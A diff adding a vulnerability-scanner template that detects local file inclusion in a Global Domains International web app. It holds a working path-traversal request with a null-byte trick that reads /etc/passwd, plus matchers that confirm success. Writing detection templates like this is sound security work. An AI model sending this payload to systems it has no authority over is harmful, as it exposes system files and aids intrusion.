@@ -1,0 +1,22 @@
+id: global-domains-lfi
+name: Global Domains International - Local File Inclusion
+severity: high
+confidence: tentative
+description: Global Domains International is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- globaldomains
+- lfi
+- traversal
+- vuln
+requests:
+- method: GET
+  path: /kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11
+  matchers:
+  - type: regex
+    regex:
+    - root:[x*]:0:0
+  - type: status
+    status:
+    - 200
+  condition: and
